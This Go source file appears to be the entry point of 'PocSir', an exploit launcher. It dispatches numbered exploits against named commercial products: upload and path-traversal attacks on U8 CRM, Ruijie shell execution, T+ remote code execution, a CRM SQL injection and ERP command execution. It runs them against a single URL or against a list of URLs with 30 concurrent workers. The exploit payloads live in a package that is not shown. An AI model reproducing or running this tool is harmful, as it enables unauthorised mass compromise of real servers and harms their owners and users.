package main

import (
	"PocSir/config"
	"PocSir/poc"
	"bufio"
	"flag"
	"fmt"
	"github.com/fatih/color"
	"os"
	"strings"
	"sync"
	"time"
)

func Banner() {
	banner := `    ███████    ██         ███████                     
  ██░░░░░██  ░░         ░██░░░░██             ██   ██
 ██     ░░██  ██ ██   ██░██   ░██   ██████   ░░██ ██ 
░██      ░██ ░██░██  ░██░███████   ░░░░░░██   ░░███  
░██    ██░██ ░██░██  ░██░██░░░██    ███████    ░██   
░░██  ░░ ██  ░██░██  ░██░██  ░░██  ██░░░░██    ██    
 ░░███████ ██░██░░██████░██   ░░██░░████████  ██     
  ░░░░░░░ ░░ ░░  ░░░░░░ ░░     ░░  ░░░░░░░░  ░░      
								
									by: Qiu
`
	color.HiRed(banner)
}
func Help() {

	help := `	
Usage: ./main -h 查看帮助信息

Poc:
`
	color.HiRed(help)
}

type Pocs func(string)

var PocsMap = map[string]Pocs{
	"0": poc.U8CRM_upload_exp,
	"1": poc.U8CRM_pathTravel_exp,
	"2": poc.YiSaiTong_upload_Exp,
	"3": poc.Ruijie_Excu_Shell,
	"4": poc.Tplus_RCE,
	"5": poc.RenWoXin_Crm_Sql,
	"6": poc.QiWangERP_EXEC,
	"99": func(target string) {
		fmt.Println("sss")
	},
}

func PwnSingleTarget(target string, expName string) {
	pwnFunc, found := PocsMap[expName]
	if !found {
		config.ErrMsg.Printf("[-]没有此序列的poc")
		return
	}
	pwnFunc(target)
}

func PwnTargets(file string, expName string) {
	urls, err := os.Open(file)
	if err != nil {
		config.ErrMsg.Println("[-]打开urls文件失败")
		return
	}
	defer urls.Close()
	var wg sync.WaitGroup
	urlChan := make(chan string)

	for i := 0; i < 30; i++ {
		wg.Add(1)
		go goUrl(urlChan, &wg, expName)
	}

	scanner := bufio.NewScanner(urls)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			urlChan <- line
		}
	}
	close(urlChan)
	wg.Wait()
}

func goUrl(urlChan <-chan string, wg *sync.WaitGroup, expName string) {
	defer wg.Done()
	for target := range urlChan {
		PwnSingleTarget(target, expName)
	}

}

func main() {
	target := flag.String("u", "", "目标URL")
	expName := flag.String("exp", "", "指定利用poc")
	file := flag.String("file", "", "指定测试的文件名")
	flag.Parse()

	*target = strings.TrimSuffix(*target, "/")

	if *target == "" && *file == "" {
		Help()
	} else if *target != "" {
		Banner()
		PwnSingleTarget(*target, *expName)
	} else {
		Banner()
		start := time.Now()
		PwnTargets(*file, *expName)
		end := time.Since(start)
		config.TimePut.Printf("[*]运行时间为: %v\n", end)
	}

}
